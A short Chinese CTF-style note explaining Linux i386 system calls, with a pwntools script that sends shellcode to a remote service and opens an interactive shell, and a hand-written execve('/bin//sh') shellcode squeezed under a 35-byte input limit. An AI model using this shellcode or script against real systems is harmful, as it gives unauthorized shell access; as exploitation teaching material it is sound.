系统调用

简单的说，把调用号赋给eax，参数依次给寄存器，int x80。
比如下面的execve。
系统调用号表：/usr/include/asm/unistd.h

一开始想用pwntools自带的shellcode生成器。

from pwn import * 
#连接
con = remote('10.214.160.13',11003)
#通过context设置上下文
context(arch='i386',os='linux',bits=32)
shellcode = asm(shellcraft.sh())
con.send(shellcode)
con.interactive()

不过不行。原因应该是程序对输入做了限制在35个字符之内。

shellcode如下

/*push '/bin///sh\x00' */
push 0x68
push 0x732f2f2f
push 0x6e69622f
/* call execve('esp,0,0) */
mov ebx,esp
xor ecx,ecx
push 0xb
pop eax
cdq     /*set edx to 0,eax is known to be positive*/
int 0x80
  • cdq—Convert Double to Quad (386+)，该指令把edx扩展为eax的高位，也就是说变为64位。
    用pwntool 汇编一下发送就好了。
